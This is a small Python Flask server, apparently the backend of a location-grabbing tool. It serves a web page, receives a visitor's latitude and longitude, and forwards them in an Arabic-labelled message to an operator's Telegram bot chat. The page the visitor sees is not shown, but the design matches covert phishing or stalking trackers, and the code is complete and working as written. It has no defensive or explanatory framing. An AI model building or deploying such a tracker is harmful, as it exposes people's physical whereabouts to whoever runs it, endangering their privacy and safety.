from flask import Flask, request, send_file
import requests, os

app = Flask(__name__)

TOKEN = os.environ.get("TG_TOKEN")
CHAT_ID = os.environ.get("TG_CHAT_ID")
TG_API = f"https://api.telegram.org/bot{TOKEN}/sendMessage"

@app.route("/")
def index():
    return send_file("index.html")

@app.route("/location", methods=["POST"])
def location():
    data = request.get_json()
    lat = data.get("latitude")
    lon = data.get("longitude")
    msg = f"📍 موقع جديد\nخط العرض: {lat}\nخط الطول: {lon}"
    requests.get(TG_API, params={"chat_id": CHAT_ID, "text": msg})
    return {"status":"تم الاستلام"}